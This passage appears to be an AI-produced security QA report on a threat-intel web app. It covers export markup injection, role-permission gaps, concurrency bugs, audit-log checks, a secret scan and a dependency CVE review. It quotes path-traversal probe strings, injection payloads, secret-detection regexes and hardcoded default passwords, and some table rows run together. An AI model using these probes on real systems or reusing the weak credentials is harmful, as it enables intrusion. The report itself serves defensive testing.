| P2 | PDF export interpolates raw IOC/assessment text into a ReportLab Paragraph -- markup injection causing a crash on malformed input and rendering-level content injection on well-formed input | _render_pdf() (backend/app/api/routes/lookup.py:499-571) builds `Paragraph(f"IOC Assessment: {lookup.ioc_value}", ...)` and several other Paragraph/_section calls directly from lookup.ioc_value and AI-generated FinalAssessment text, with zero XML-escaping. ReportLab's Paragraph parses its input as a small XML/HTML-like markup dialect. (a) A value containing an unclosed/malformed tag makes reportlab.platypus.paraparser raise ValueError, which is uncaught -> unhandled 500 on every future export attempt of that specific lookup (denial of service for that record's PDF export). (b) A value containing a well-formed tag (e.g. <font color="red" size="40">...) is accepted by reportlab as real markup and renders successfully (200), meaning the free-text IOC value can inject arbitrary formatting/spoofed content into an otherwise 'official-looking' exported SOC report. | Case (a): created lookup with value='<b>INJECTED</b> title & unclosed <tag AAAA', ioc_type_hint='malware_family' (id 4a61fa8c-c4c4-45af-83f7-1169896fe12a). POST .../export?format=pdf -> HTTP 500. Backend log traceback (docker logs app-backend-1) shows: `File ".../app/api/routes/lookup.py", line 514, in _render_pdf -> story = [Paragraph(f"IOC Assessment: {lookup.ioc_value}", styles["Title"])] ... reportlab/platypus/paraparser.py ... ValueError: paraparser: syntax error: parse ended with 1 unclosed tags / para`. Case (b): created lookup with value='<font color="red" size="40">FAKE-VERDICT-INJECTED</font>', ioc_type_hint='malware_family' (id 8fddb9cb-6b69-48ec-8799-60ded65f0a34). POST .../export?format=pdf -> HTTP 200, valid PDF returned (whereas the malformed-tag case with an unclosed tag 500'd, confirming reportlab is genuinely parsing this text as markup rather than displaying it literally). Both test lookups deleted after test; verified 0 rows remain. | 1) POST /api/v1/lookup/stream {value:'<b>INJECTED</b> title & unclosed <tag AAAA', ioc_type_hint:'malware_family'} -> lookup_id. 2) POST /api/v1/lookup/{lookup_id}/export?format=pdf -> 500 Internal Server Error, confirmed via container logs to be the reportlab paraparser ValueError shown above. |
| P2 | Export endpoint is gated on lookup:read instead of the dedicated lookup:export permission -- VIEWER role can download exports despite the permission matrix (and the docs) explicitly reserving a separate permission to prevent that | backend/app/models/user.py's ROLE_PERMISSIONS grants 'lookup:export' to ADMIN and ANALYST but NOT to VIEWER (VIEWER only gets {'lookup:read','evidence:read','case:read','security_assessment:read'}). docs/API_DOCUMENTATION.md itself documents this: '\| `lookup:export` \| Yes \| Yes \| No \|' (line 57) and explicitly instructs that when a real export endpoint is built it 'should ... be gated behind the already-reserved `lookup:export` permission' (lines 423-425). However, `export_lookup()` in backend/app/api/routes/lookup.py:574-579 uses `Depends(require_permission("lookup:read"))`, not lookup:export. Since VIEWER already has lookup:read, a VIEWER-role user can successfully call the export endpoint and download real PDF/CSV files, contradicting the documented/intended design. `lookup:export` is dead code -- it is defined in the permission matrix but never referenced by `require_permission` anywhere in the codebase (grep across backend/app confirms zero uses outside the matrix definition itself). | Minted a viewer-role JWT for the pre-existing disposable account qa-ent-viewer-a@qa.test (role VIEWER, is_active=true) and an existing lookup id. GET /api/v1/lookup/{id} -> 200 (expected, lookup:read). POST /api/v1/lookup/{id}/export?format=csv as the same viewer token -> 200, 334 bytes of real CSV content. POST .../export?format=pdf as viewer -> 200, 2185 bytes starting with b'%PDF'. Unauthenticated request to the same endpoint -> 401 (auth itself works; it's the role-permission check that's wrong). No test rows created for this check (used only a pre-existing viewer account and a pre-existing lookup, both read-only). | Mint an access token with role='viewer' for qa-ent-viewer-a@qa.test (existing disposable account, is_active=true, token_version=0) via app.auth.security.create_access_token. Call POST /api/v1/lookup/{any_lookup_id}/export?format=csv (or pdf) with that token -> 200 with real file content, despite VIEWER lacking 'lookup:export' in ROLE_PERMISSIONS. |
| info | No path-traversal surface exists anywhere in the backend's file-producing code (confirmed absence, reported for completeness) | Full-repo grep of backend/app (excluding tests) for open(, Path(, os.path.join(, NamedTemporaryFile, mkstemp, shutil.*, UploadFile, StaticFiles, FileResponse, tempfile, .write(, and 'filename' found no filesystem operation anywhere that incorporates a request-derived string. The only export-adjacent 'filename' usage is `filename = f"ioc-assessment-{lookup_id}.{format}"` in lookup.py, used solely inside an HTTP Content-Disposition header string -- never passed to any filesystem call. `lookup_id` is typed `uuid.UUID` as a FastAPI path parameter (rejected with 422/404 before reaching the handler if not a valid UUID -- confirmed live with '../../../etc/passwd' and URL-encoded traversal payloads, both blocked before the handler ran) and `format` is a Pydantic `Literal['pdf','csv']` (confirmed live: any other value, including traversal strings, returns 422). Both `_render_csv`/`_render_pdf` build output entirely in memory (io.StringIO/io.BytesIO) and return it as an HTTP Response body -- no disk I/O occurs at all. The Security Assessment Toolkit's hash_tool.py performs pure string/regex analysis on the hash value with zero file I/O (confirmed by reading the full file), and nmap_tool.py's only filesystem-adjacent call is `shutil.which('nmap')` (binary existence check, not user-data-driven). There is no file-upload endpoint, no StaticFiles mount, and no FileResponse anywhere in the backend. | grep -rn "open(\\|Path(\\|os\.path\.join(\\|NamedTemporaryFile\\|mkstemp\\|shutil\." backend/app (excl. tests) -> only hit is nmap_tool.py:95 `shutil.which("nmap")`. Live traversal probes against both the `format` query param and the `lookup_id` path param (`../../../etc/passwd`, `pdf/../../etc/passwd`, `..%2f..%2fetc%2fpasswd`) all returned 422 or 404, never reaching any file operation. | N/A -- negative finding confirmed by full source review plus live probing of the export endpoint's two parameters with traversal payloads. |

### 15. Frontend chaos testing (real browser automation)

**Summary:**

Drove the live app at http://localhost:3000 with real headless Chrome via puppeteer-core (documentation/build/chaos-walkthrough.js and chaos-followup.js, new scripts following the existing walkthrough.js pattern), authenticated as the disposable qa-ent-analyst-a@qa.test persona by minting a JWT inside app-backend-1 (via create_access_token, never printed/persisted -- the docker-exec bridge and localStorage injection happen entirely inside the node script's memory) and injecting it into localStorage instead of touching a password. Tested: full-page refresh mid-investigation, browser back/forward during an active investigation, the same account open in two tabs (including a forced concurrent-write race), rapid double-clicking of submit buttons, and logging out in one tab while an operation is in flight in another. Every finding below was cross-checked against ground truth in Postgres (docker exec app-postgres-1 psql, read-only except for cleanup of my own tagged rows) and/or backend tracebacks in `docker logs app-backend-1`, not just UI appearance. All test IOC values used the `chaos-*.example.com` / reserved documentation-domain convention (never a real third party); all 15 test IOCLookup rows, 4 basket_items rows, and 1 test case were deleted afterward in FK-safe order and confirmed at 0 remaining.

**Findings (7):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| P2 | Refreshing mid-investigation does not resume it -- it silently abandons the original and starts a brand-new duplicate investigation | `/lookup/new?value=X` always POSTs a fresh `/api/v1/lookup/stream` on mount and never navigates to a persistent `/lookup/{id}` URL after completion, so there is nothing to 'resume' from. A full-page reload (F5) re-mounts the page and fires an entirely new POST, creating a second, independent `IOCLookup` row for the same value while the first is abandoned server-side (its client connection drops, so it never reaches `final_assessment`/`completed`). The UI shows no warning that this will happen, and the post-refresh screen looks visually identical to the pre-refresh screen (same '2/8 providers responded, PENDING' layout), completely masking that a new investigation -- with its own fresh round of provider calls and AI calls -- was just started from zero. | Reproduced twice. DB ground truth (docker exec app-postgres-1 psql): for ioc_value 'chaos-refresh-1786790732124.example.com', two ioc_lookups rows exist 4 seconds apart (b0beb0ad-..., created 10:45:32; d2235fde-..., created 10:45:36), BOTH status=FAILED. Same pattern repeated for 'chaos-refresh-1786791010000.example.com' (02aeb02b-... and c9e5f7b1-..., 4s apart, both FAILED). Screenshots chaos-01-1-before-refresh-mid-lookup.png and chaos-02-1-immediately-after-refresh.png (C:\Users\User\ioc-intel-platform\documentation\build\raw-screenshots\) are pixel-identical in layout despite being two different lookup_ids under the hood. | 1) Log in as an analyst. 2) Go to /lookup/new?value=<any new domain>. 3) Wait ~3s so some provider_result events land but the investigation is not done. 4) Press F5 (full reload). | P2 | Concurrent 'Add to Basket' for the same new IOC (double-click or two tabs) throws an unhandled IntegrityError -> raw 500 | `add_to_basket` in backend/app/api/routes/basket.py does a check-then-insert (SELECT existing, then INSERT if none) that is not atomic. When two requests for the same not-yet-basketed ioc_value race within the same transaction window, both pass the SELECT, then the second INSERT hits the `uq_basket_owner_ioc` unique constraint and raises `sqlalchemy.exc.IntegrityError`, which is never caught in this route (contrast with the equivalent upsert pattern in app/core/runtime_config.py and app/core/users.py, which both explicitly catch IntegrityError). This surfaces to the client as a bare 'Internal Server Error' (no JSON body). The frontend's generic catch turns this into a vague 'Failed to add to basket.' toast for what the user experiences as an ordinary click on their own basket. | Reproduced 3 times independently: (1) isolated concurrent httpx POSTs from inside app-backend-1 -- first request 201 Created, second 500 Internal Server Error, full traceback captured: 'sqlalchemy.dialects.postgresql.asyncpg.AsyncAdapt_asyncpg_dbapi.IntegrityError: ... duplicate key value violates unique constraint "uq_basket_owner_ioc"'; (2) live two-tab simultaneous click in chaos-walkthrough.js scenario 3b (backend log: one 201, one 500 for ioc_value chaos-tworace-1786791027609.example.com); (3) clean isolated follow-up (chaos-followup.js Check B) for ioc_value chaos-cleanrace-1786791259641.example.com -- backend log shows '172.21.0.1:56676 - "POST /api/v1/basket HTTP/1.1" 500 Internal Server Error' with traceback pointing at 'File "/app/app/api/routes/basket.py", line 84, in add_to_basket' immediately followed by a 201 from the other tab. DB confirms no data corruption either time (exactly 1 basket_items row per value, thanks to the DB constraint) -- this is purely an unhandled-exception/reliability bug, not data loss. | From two browser tabs logged in as the same account, both viewing a fresh (never-basketed) IOC's investigation page, click 'Add to Basket' in both tabs within the same ~100ms window. One tab gets 201, the other gets a raw 500 (backend log shows the IntegrityError traceback at basket.py:84). |
| P2 | 'Add to Case' has zero duplicate protection -- concurrent identical requests silently create duplicate IOC rows in the case | Unlike basket.py, `add_case_ioc` in backend/app/api/routes/cases.py performs no existing-row check at all and there is no unique constraint on CaseIOC (case_id, ioc_value). Two concurrent (or rapidly double-clicked) 'Add to Case' requests for the identical ioc_value both return 201 and both persist, leaving the case permanently showing the same IOC listed twice with no error and no warning to the analyst. | Verified via a direct backend test (2 concurrent POST /api/v1/cases/{id}/iocs for ioc_value 'qa-chaos-race-case-ioc.example.com'): both returned 201, and GET /api/v1/cases/{id} afterward showed 2 matching IOC rows for that exact value. Test case (id ba9c7920-3701-495e-8fbf-4e9bf3e28f44, title 'qa-chaos-dup-ioc-case') and both duplicate rows were deleted afterward (case_iocs then cases, FK-safe order) and confirmed removed. | POST /api/v1/cases/{case_id}/iocs twice, near-simultaneously, with identical {ioc_value, ioc_type} body. After tab A signs out (clearing both tokens), tab B -- which was mid-investigation -- keeps rendering the completed investigation UI indefinitely (basket badge count, action buttons, etc. all still shown as if logged in) because nothing re-checks auth state. Its in-flight SSE stream finishes normally regardless (the JWT was already sent in the original request header). The FIRST subsequent authenticated action in tab B (e.g. 'Add to Basket') does not redirect to /login: `authedFetch()`'s 401-then-failed-refresh path (lib/api.ts) has no onAuthExpired-style hook -- that redirect behavior exists only for the dedicated SSE lookup-stream path (app/lookup/new/page.tsx's onAuthExpired). The user just sees the same generic 'Failed to add to basket.' message used for any other transient error, with no indication that they need to sign in again. | Screenshot chaos-21-5-tabB-add-to-basket-after-session-died.png (C:\Users\User\ioc-intel-platform\documentation\build\raw-screenshots\) shows tab B still fully rendered (Basket badge '3', all panels populated, verdict shown) with 'Failed to add to basket.' printed under Investigation Actions -- no login prompt, no banner, URL unchanged (still on /lookup/new?value=chaos-logoutrace-...), tabBUrlNow.includes('/login') === false. | Tab A and Tab B both logged in as the same account (shared localStorage). Wait for tab B's investigation to finish, then click 'Add to Basket' in tab B: no redirect to /login occurs; a generic failure message appears instead. |
| info | Positive finding: browser back/forward during an active investigation is handled correctly via Next.js's client-side router cache | Navigating away from an in-progress /lookup/new?value=X page (e.g. to Home) and then pressing Back does NOT create a duplicate lookup and does NOT abandon the original -- Next.js's client router keeps the page's React component (and its live SSE fetch) mounted/alive in the background. ### 16. Audit log integrity

**Summary:**

Against the live app-backend-1/app-postgres-1 stack, I created disposable qa-ent-auditlog-* personas and drove all 7 required actions through the real HTTP API (http://localhost:8000/api/v1: /auth/login, /admin/users, /admin/users/{id} PATCH, /admin/users/{id}/active, /runtime/ai-providers/bedrock, /security-assessment/{lookup_id}/run against target 127.0.0.1 with the real nmap tool): successful login, failed login, user creation, role change, account disable, an AI-provider config change on the disposable/inactive 'bedrock' slot (credentials={} so no real key was touched; model_id changed then reverted), and a full security-assessment run to completion. For each I read config_audit_log directly via docker exec app-backend-1 / app-postgres-1 (read-only) and confirmed a matching row with correct actor, target, action name and timestamp before cleanup. I also swept the entire ~1347-row config_audit_log history (not just my new rows) for password/secret/token/api_key/credential-shaped text and for Bearer/JWT/sk-/AKIA-shaped substrings. I verified the dev-tree source (C:\Users\User\ioc-intel-platform\backend) byte-for-byte matches what's actually running in app-backend-1 for every file involved (audit.py, users.py, auth.py, runtime_config.py, security_assessment.py, admin.py) before trusting my reading of the code, per the dual-source-tree gotcha in memory. Cleanup: deleted my qa-ent-auditlog-admin/analyst users (clearing config_audit_log.actor_user_id and provider_runtime_configs.updated_by FK references first, matching the codebase's own established _delete_user pattern), deleted the disposable IOCLookup, and restored bedrock's model_id/updated_by to their pre-test values. Verified post-cleanup that no qa-ent-auditlog-* rows remain anywhere and the AI-provider baseline (ollama still the active backend, anthropic/groq unchanged) is intact. One unrelated concurrent QA persona (qa-ent-chaos-*) was mutating the same AI-provider config tables during this run; the audit log correctly and distinctly attributed every one of those actions to that other actor and never conflated it with mine, which is itself supporting evidence of correct actor attribution under concurrent load.

**Findings (3):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| info | All 7 required actions produced correct, accurate audit entries | Every action in the required list produced a config_audit_log row with the correct action name, actor_user_id/actor_email, human-readable target detail, and timestamp, verified by direct read-only query immediately after each HTTP call: auth.login (actor=self, detail "User '<email>' logged in."), auth.login_failed (detail names the attempted email; by design actor_user_id/actor_email are both NULL since no session exists yet -- the failed identity is only in the free-text detail, not a structured actor field), user.create (actor=admin persona, detail names new user + role 'analyst'), user.update (actor=admin, detail "role (analyst -> viewer)"), user.disable (actor=admin, detail names disabled user), ai_provider.configure x2 (actor=admin, detail "Configured AI provider 'bedrock'."), security_assessment.run_requested and security_assessment.run_completed (actor=admin, detail names tool 'nmap', profile 'quick', target '127.0.0.1', and finding count). No action from the required list failed to produce an entry. | — | — |
| info | No credential/password/token/API-key values found in config_audit_log across full history | Regex-swept the entire config_audit_log table (1347 rows spanning this and prior QA sessions) for text matching password\|secret\|token\|api.?key\|credential (31 hits) and separately for Bearer/JWT/sk-/AKIA-shaped substrings (0 hits). Every hit from the first sweep was a user.password_reset row using the fixed safe template "Administrator reset the password for user '<email>'." with no actual password value present. My own test's disposable admin/analyst passwords (held only in-process, never printed) were also explicitly substring-checked against every new row and found in none. | — | — |
| P4 | @qa.test disposable email domain is rejected by /auth/login and /auth/register with HTTP 422, contrary to the stated QA convention | The LoginRequest/RegisterRequest pydantic schemas use EmailStr (via the email-validator library), which rejects the .test TLD as a 'special-use or reserved name' with a 422 before the request ever reaches application logic or the database. Confirmed: POST /auth/login with email ending in @qa.test or @test.qa.test returns 422 'value is not a valid email address: The part after the @-sign is a special-use or reserved name...', while the identical request with @example.com or @qa.example.com returns the expected 401 for a nonexistent user. This means personas following the '@qa.test' half of the stated disposable-data convention cannot actually authenticate through the real HTTP API at all (only bypassable via direct service-layer/DB calls, which never exercises the real login code path or its auth.login/auth.login_failed audit entries). Not an audit-log-integrity bug itself, but it would silently break any tester's login/failed-login audit test if they picked the .test suffix, so I switched my login-capable personas to @example.com after discovering this. | docker exec app-backend-1 python3 httpx POST /api/v1/auth/login {"email":"nonexistent@qa.test",...} -> 422 {"detail":[{"type":"value_error","loc":["body","email"],"msg":"value is not a valid email address: The part after the @-sign is a special-use or reserved name that cannot be used with email.",...}]}; same call with @example.com -> 401 {"detail":"Invalid email or password"}. | — |

*Note: finding #1 in this dimension ("All 7 required actions produced correct, accurate audit entries") had additional non-standard field(s) in the source data not shown in the table above — `category`: "result"; `failure_scenario`: "N/A -- this is a pass, not a failure. Full raw audit rows captured during the test run (before required FK-cleanup deletion) showed all 10 entries (bootstrap + the 7 required actions, with AI-provider configure counted twice for change+revert) with correct actor/action/detail/timestamp and zero credential-shaped substrings.".*

*Note: finding #2 in this dimension ("No credential/password/token/API-key values found in config_audit_log across full history") had additional non-standard field(s) in the source data not shown in the table above — `category`: "credential-leak"; `failure_scenario`: "N/A -- this is a pass. If a future code change ever interpolated a raw credential into a record_audit() detail string, this same sweep pattern would catch it as a hit outside the known-safe password_reset template.".*

*Note: finding #3 in this dimension ("@qa.test disposable email domain is rejected by /auth/login and /auth/register with HTTP 422, contrary to the stated QA convention") had additional non-standard field(s) in the source data not shown in the table above — `category`: "test-environment-gotcha"; `failure_scenario`: "A tester creates persona 'someone@qa.test', calls POST /api/v1/auth/login with correct credentials expecting a 200 + auth.login audit row, and instead gets a 422 from pydantic email validation with no audit entry at all (correctly so, since the request never reached the login handler) -- easy to misread as an audit-logging gap rather than an email-validation quirk.".*

### 17. Independent secret scan (dev tree: C:\Users\User\ioc-intel-platform)

**Summary:**

Scanned the dev tree (excluding .venv/.venv_test/node_modules/.next) with targeted regex greps for sk-/AKIA/-----BEGIN/AIza/ghp_/xox/JWT patterns, password/secret/api_key/token assignments, and embedded-credential connection strings, across .py/.ts/.tsx/.yml/.yaml/.json/.md/.js/.ps1 files. Also inspected .env vs .env.example, docker-compose*.yml, k8s/base/secret.example.yaml, windows/wizard/Setup-Wizard.ps1 and windows/scripts/*.ps1, and pulled --tail 500 logs from all 8 running containers (app-backend-1, app-frontend-1, app-postgres-1, app-redis-1, app-neo4j-1, app-opensearch-1, app-celery_worker-1, app-celery_beat-1) grepped for the same patterns. Cross-checked two suspicious source defaults against the live backend container's actual Settings object (booleans/lengths only, no values printed) and against the users table via psql. No real secret value was printed anywhere in this process (one attempted partial-value check was correctly blocked by the sandbox and abandoned in favor of length/prefix-boolean checks). Note: this directory has no .git (not a VCS repo), so there is no commit history to check for secrets that were committed-then-removed; findings reflect only the current on-disk state.

**Findings (4):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| P2 | Weak, hardcoded default datastore credentials in source are actually in effect on the live Postgres container | backend/app/core/config.py:39 hardcodes `database_url: str = "postgresql+asyncpg://ioc:ioc@postgres:5432/ioc_intel"` and :43 hardcodes `neo4j_password: str = "changeme-neo4j"`; docker-compose.yml mirrors this with `${POSTGRES_PASSWORD:-ioc}` (lines 6, 76, 115) and `NEO4J_AUTH: neo4j/${NEO4J_PASSWORD:-changeme-neo4j}` (line 41). The dev-tree .env does not set POSTGRES_PASSWORD, NEO4J_PASSWORD, POSTGRES_USER, or POSTGRES_DB at all (confirmed via grep -c presence-count, 0 matches for each), so any deployment that skips the Windows setup wizard's random-secret generation (windows/scripts/Write-EnvFile.ps1's `New-RandomSecret -Bytes 24` for PostgresPassword/Neo4jPassword) and just runs `docker compose up` silently falls back to these guessable defaults. Verified live: querying the running app-backend-1 container's actual `Settings()` object shows `database_url` still equals the literal default containing `ioc:ioc@` (boolean check returned True), i.e. the live Postgres instance backing this threat-intel platform is currently reachable with the well-known default password baked into committed source/compose files. (Neo4j's live password was separately confirmed NOT to be the default, so this specific weakness is Postgres-only in the current running instance.) | backend/app/core/config.py:39 `database_url: str = "postgresql+asyncpg://ioc:ioc@postgres:5432/ioc_intel"`; docker-compose.yml:6 `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-ioc}`; dev-tree .env has 0 lines matching `^POSTGRES_PASSWORD=`; live check `docker exec app-backend-1 python -c "from app.core.config import Settings; print('ioc:ioc@' in Settings().database_url)"` returned True. | 1) Inspect backend/app/core/config.py line 39 and docker-compose.yml lines 6/41/76/115. 2) `grep -c '^POSTGRES_PASSWORD=' .env` in the dev tree returns 0, confirming no override. 3) Run the boolean check above against app-backend-1 to confirm the default is the value actually in effect. |
| P3 | Insecure hardcoded fallback JWT signing secret ships in source (fail-open on missing config) | backend/app/core/config.py:29 hardcodes `jwt_secret_key: str = Field(default="change-me-in-production")`. If JWT_SECRET_KEY is ever absent from the environment (e.g. a misconfigured deployment, a stripped-down .env, or a container started without its env_file), the app starts successfully anyway and silently signs/verifies all auth JWTs with this exact, publicly-committed string -- letting anyone who has read this source file forge a valid access token for any user/role via `create_access_token` semantics, with no startup warning or crash. Currently NOT the active value on either the dev-tree .env or the live container (both confirmed non-default, non-empty), so this is a latent/defense-in-depth gap rather than an active compromise today. | backend/app/core/config.py:29 `jwt_secret_key: str = Field(default="change-me-in-production")`. Live check `docker exec app-backend-1 python -c "from app.core.config import Settings; print(Settings().jwt_secret_key == 'change-me-in-production')"` returned False (not currently exploited). | Inspect backend/app/core/config.py line 29. To reproduce impact: unset JWT_SECRET_KEY in the environment and start the backend -- it will boot without error and accept the hardcoded default as its signing key instead of refusing to start. |
| P3 | Hardcoded plaintext admin/analyst passwords committed in documentation walkthrough scripts | documentation/build/walkthrough.js:16-17 hardcodes `ADMIN_EMAIL = 'final-admin@example.com'` / `ADMIN_PASSWORD = 'FinalTestPass123!'`; documentation/build/walkthrough-admin.js:14-15 hardcodes `ADMIN_EMAIL = 'docs-walkthrough-admin@example.com'` / `ADMIN_PASSWORD = 'WalkthroughQA-2026!'`; documentation/build/walkthrough-secassess.js:13-14 hardcodes `ANALYST_EMAIL = 'secassess-walkthrough@example.com'` / `ANALYST_PASSWORD = 'WalkthroughQA-2026!'`. These scripts only type the credentials into the live login form (they do not self-register), meaning the accounts were manually created against the real running app at some point with these exact plaintext passwords. None of the three emails currently exist in the users table (checked via psql, 18 total users, none matching), so there is no immediately exploitable live account right now, but the plaintext passwords remain permanently readable in the dev tree and would become live credentials again the moment any of these accounts is recreated with a matching password (e.g. for a future documentation refresh). | documentation/build/walkthrough.js:17 `const ADMIN_PASSWORD = 'FinalTestPass123!';`; documentation/build/walkthrough-admin.js:15 and walkthrough-secassess.js:14 both `const ...PASSWORD = 'WalkthroughQA-2026!';`. `docker exec app-postgres-1 psql -U ioc -d ioc_intel -c "SELECT email,role FROM users;"` lists 18 users, none matching final-admin@example.com / docs-walkthrough-admin@example.com / secassess-walkthrough@example.com. | Read the three files at the line numbers above. Cross-check current DB state with `docker exec app-postgres-1 psql -U ioc -d ioc_intel -c "SELECT email FROM users;"` to confirm no matching live account exists today. |
| info | Dev-tree .env contains real-looking third-party API keys and an AWS key pair in plaintext (correctly gitignored, not the config the live containers actually load) | C:\Users\User\ioc-intel-platform\.env has non-empty values (lengths only checked, no values printed) for JWT_SECRET_KEY (33 chars), AWS_ACCESS_KEY_ID (20 chars, matches AKIA-prefixed real AWS access-key-ID format per grep), AWS_SECRET_ACCESS_KEY (40 chars, matches real AWS secret-key length), GEMINI_API_KEY (53 chars), VIRUSTOTAL_API_KEY (64 chars), ABUSEIPDB_API_KEY (80 chars), OTX_API_KEY (64 chars), NVD_API_KEY (36 chars, UUID-shaped), ABUSECH_AUTH_KEY (48 chars), HYBRID_ANALYSIS_API_KEY (64 chars), and CENSYS_PERSONAL_ACCESS_TOKEN (40 chars) -- all lengths consistent with genuine (non-placeholder) credentials for those services, versus .env.example where every one of these keys is correctly left blank. This is expected local developer configuration, not a defect: .gitignore:1-2 excludes `.env` and `.env.*` (with `.env.example` explicitly un-ignored), the directory has no .git history to leak through, and per the memory note on this platform's dual source tree, this dev-tree .env is not even the file the running Docker containers actually load (confirmed indirectly: the live backend's JWT secret length, 61 chars, does not match this file's 33 chars, so the installed copy under Program Files has its own separate .env). Flagged for completeness per the task's instruction to check .env for real-looking values, not as a vulnerability. | awk-based length-only scan of ioc-intel-platform\.env (no values printed) vs. ioc-intel-platform\.env.example (every corresponding key blank); .gitignore lines 1-2 (`.env` / `.env.*` / `!.env.example`); grep for `AKIA[0-9A-Z]{12,}` matched only this file. | Compare key-by-key: `.env.example` has every provider key blank; `.env` has non-empty, format-plausible values of the lengths listed above. `.gitignore` confirms `.env` is excluded from version control. |

### 18. Dependency security inventory (backend/requirements.txt + frontend/package.json)

**Summary:**

Read backend/requirements.txt (32 pinned deps) and frontend/package.json (14 deps + 9 devDeps) from the dev tree at C:\Users\User\ioc-intel-platform, and confirmed the installed copy under "C:\Program Files\IOC Intelligence Platform\app" and the live app-backend-1 container's `pip list` are byte-identical to these manifests (no drift). Every entry in both manifests is pinned to an exact version (no unpinned/range specifiers anywhere). For each notable package I checked real usage in the app's own source (grep for import sites: JWT auth in backend/app/auth/security.py, Fernet encryption in backend/app/core/crypto.py, WHOIS lookups in backend/app/providers/whois_rdap.py, RSS ingestion in backend/app/crawler/sources/rss_news.py, Next.js middleware/config in frontend/) rather than guessing from the package name alone. I then verified currency against real vulnerability data three ways: (1) `npm audit` against the frontend lockfile, (2) `pip-audit` (both default and --vulnerability-service osv) against the exact pinned backend versions, and (3) direct queries to the public OSV.dev API (api.osv.dev) run from inside app-backend-1 for each exact package==version pair, cross-checked against two GitHub Security Advisory pages fetched directly. No packages were upgraded; this is inventory/analysis only.

**Findings (12):**

| Severity | Title | Description | Evidence | Reproduction |
|---|---|---|---|---|
| P2 | frontend package.json pins next==14.2.15, which OSV.dev lists 30 confirmed advisories against for this exact version, including a critical (CVSS 9.1) middleware auth-bypass | Direct query to https://api.osv.dev/v1/query for package 'next' ecosystem 'npm' version '14.2.15' returned 30 vulns, including GHSA-f82v-jwr5-mffw/CVE-2025-29927 'Authorization Bypass in Next.js Middleware' (fixed in 14.2.25) and clusters of SSRF, HTTP request smuggling, XSS, and cache-poisoning advisories in Server Actions, Image Optimization, and rewrites, most dated through 2026. `npm audit --omit=dev` in frontend/ independently flagged the same `next` range as critical. I checked which attack surfaces this specific app actually uses: `find` for middleware.ts/tsx under frontend/ found none (only vendored copies inside node_modules/.next), next.config.js has no rewrites/i18n (just reactStrictMode + output:standalone), and `grep` for '"use server"'/'next/image'/'remotePatterns' under frontend/app and frontend/components found zero matches. That rules out the middleware-bypass, rewrites-SSRF/smuggling, i18n-middleware-bypass, Server-Actions, and Image-Optimization advisory clusters specifically for this deployment. What's NOT ruled out: a residual cluster of React-Server-Component cache-poisoning/confusion advisories (e.g. GHSA-vfv6-92ff-j949, GHSA-wfc6-r584-vfw7, GHSA-4633-3j49-mh5q) that are inherent to App Router's RSC machinery regardless of whether the app writes its own Server Actions, since App Router uses RSC for every route by default. Next.js is the actual internet/LAN-facing web tier for this app, ships frequent patch-only fixes, and 14.2.15 is now nearly a year of patch releases behind 14.2.x HEAD -- this is the single highest-value, lowest-risk version bump in the whole inventory (patch release, not a major bump). | OSV query from app-backend-1: POST https://api.osv.dev/v1/query {package:{name:'next',ecosystem:'npm'},version:'14.2.15'} -> 30 vulns incl. GHSA-f82v-jwr5-mffw (CVE-2025-29927, fixed 14.2.25). `npm audit --omit=dev` in frontend/ flags `next 0.9.9 - 16.3.0-preview.10` critical. `find frontend -iname 'middleware.*'` returns only node_modules/.next paths, no app-owned middleware file. grep for '"use server"\|next/image\|remotePatterns' under frontend/app and frontend/components: no files found. | docker exec app-frontend-1 (or host) npm audit --omit=dev inside C:\Users\User\ioc-intel-platform\frontend; or POST {"package":{"name":"next","ecosystem":"npm"},"version":"14.2.15"} to https://api.osv.dev/v1/query |
